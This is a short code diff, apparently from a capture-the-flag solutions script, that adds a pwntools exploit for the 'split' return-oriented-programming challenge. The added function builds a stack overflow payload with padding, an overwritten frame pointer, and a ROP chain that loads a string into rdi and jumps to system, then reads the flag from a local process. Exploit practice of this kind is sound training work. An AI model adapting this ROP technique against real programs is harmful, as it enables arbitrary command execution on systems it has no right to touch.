@@ -26,8 +26,26 @@ def ret2win(path):
 
     return True
 
-def split():
-    pass
+def split(path):
+
+    payload = b''
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
+    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42' # RBP
+    payload += b'\x83\x08\x40\x00\x00\x00\x00\x00' # RIP: go to 'pop rdi'
+    payload += b'\x60\x10\x60\x00\x00\x00\x00\x00' # value to pop in rdi
+    payload += b'\x10\x08\x40\x00\x00\x00\x00\x00' # RIP: got to _system
+
+    p = process(path)
+    p.sendline(payload)
+    #p.interactive()
+    p.recvuntil("Contriving a reason to ask user for data...\n")
+    flag = p.recvline()
+    success(flag)
+
+    return True
 
 
 def callme():
